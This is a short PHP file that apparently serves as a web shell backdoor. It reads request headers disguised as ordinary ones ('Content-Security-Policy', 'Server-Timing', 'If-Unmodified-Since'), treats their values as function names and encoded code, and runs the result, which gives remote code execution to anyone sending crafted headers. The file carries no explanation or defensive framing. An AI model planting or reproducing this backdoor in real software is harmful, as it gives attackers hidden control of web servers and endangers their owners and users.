<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $content = $_HEADERS['Content-Security-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['If-Unmodified-Since']));
    $content();
}